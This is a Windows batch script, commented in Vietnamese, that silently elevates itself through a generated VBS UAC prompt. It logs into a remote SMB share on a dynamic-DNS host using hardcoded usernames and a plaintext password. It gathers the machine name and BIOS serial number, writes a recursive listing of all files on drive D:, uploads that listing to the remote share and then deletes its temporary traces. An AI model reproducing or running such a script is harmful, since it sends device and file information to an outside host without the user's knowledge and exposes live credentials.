@echo off
rem Doc Thong Tin O D

set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
net use "\\minhtuan283.ddns.net\hdd25" /user:minhtuan283 Thienngan2002 /persistent:no

REM Nếu đăng nhập với user đầu tiên không thành công, thử user thứ hai
if %errorlevel% neq 0 (
    echo Dang nhap voi user minhtuan283 that bai, thu voi user giabao...
    net use "\\minhtuan283.ddns.net\hdd25" /user:giabao Thienngan2002 /persistent:no
)

:: Lấy tên máy tính bằng PowerShell
for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i

:: Lấy Serial Number từ BIOS bằng PowerShell
for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_Bios).SerialNumber"') do set SerialNumber=%%i

:: Lấy ngày và giờ hiện tại
for /f "tokens=2 delims= " %%a in ('date /t') do set DATE=%%a
for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
set DATE=%DATE:/=-%
set TIME=%TIME::=-%

:: Tạo file tên theo định dạng "%DeviceName%_%SerialNumber%_%DATE%_%TIME%.txt"
set FileName=%DeviceName%_%SerialNumber%_%DATE%_%TIME%.txt
set TempFilePath=%temp%\%FileName%

:: Liệt kê toàn bộ thư mục và file tại D:\ và ghi vào file tạm
dir "D:\" /s > "%TempFilePath%"

:: Di chuyển file đến vị trí chia sẻ mạng
net use \\minhtuan283.ddns.net\hdd25 /user:minhtuan283 Thienngan2002
move "%TempFilePath%" "\\minhtuan283.ddns.net\hdd25\serial\list\%FileName%"

:: Xóa file tạm và các biến tạm
if exist "%TempFilePath%" del "%TempFilePath%"
net use \\minhtuan283.ddns.net\hdd25 /delete
set DeviceName=
set SerialNumber=
set DATE=
set TIME=
set FileName=
set TempFilePath=

exit /b
